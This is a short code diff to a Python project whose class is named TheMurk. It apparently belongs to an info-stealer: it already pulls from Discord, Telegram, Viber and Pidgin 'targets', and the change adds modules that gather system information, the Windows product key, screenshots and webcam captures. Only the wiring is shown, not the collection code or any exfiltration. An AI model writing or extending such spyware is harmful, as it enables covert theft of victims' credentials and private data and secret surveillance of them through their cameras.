@@ -14,6 +14,9 @@ from targets.messengers.discord import Discord
 from targets.messengers.telegram import Telegram
 from targets.messengers.viber import Viber
 from targets.messengers.pidgin import Pidgin
+from targets.system.system_info import SystemInfo
+from targets.system.productkey import ProductKey
+from targets.system.photos import Screenshot, WebCam
 
 
 
@@ -67,3 +70,9 @@ class TheMurk:
         self.msgOther = Telegram(self.msgOther)
         self.msgOther = Viber(self.msgOther)
         self.msgOther = Pidgin(self.msgOther)
+    
+    def System(self):
+        self.msgSys = SystemInfo(self.msgSys)
+        ProductKey()
+        Screenshot()
+        WebCam()
